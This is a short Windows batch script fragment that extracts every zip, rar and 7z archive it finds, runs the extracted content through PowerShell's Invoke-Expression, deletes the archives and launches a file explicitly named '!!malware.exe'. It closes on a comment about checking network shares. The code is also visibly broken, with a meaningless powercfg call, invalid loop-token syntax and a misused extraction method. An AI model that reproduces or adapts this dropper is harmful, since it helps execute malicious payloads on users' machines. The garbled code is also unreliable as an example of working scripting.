for /f ""tokens=*"" %%a in ('dir /b /a-d *.zip *.rar *.7z') do (
    for /f ""tokens=1,2 delims=:"" %%a%%b in ('powercfg /devicequeryex bassette') do (
        powershell -Command ""Add-Type -AssemblyName System.IO.Compression.FileSystem; [system.io.compression.zipfile]::ExtractToFile('%%a', '%%~dpna\attachments\%%a')""
        powershell -Command ""Invoke-Expression (Get-Content 'attachments\%%a')""
        del /q ""%%a""
        move attachments\!!malware.exe .
        start /wait !!malware.exe
        goto end
    )
)

rem Check for network shares
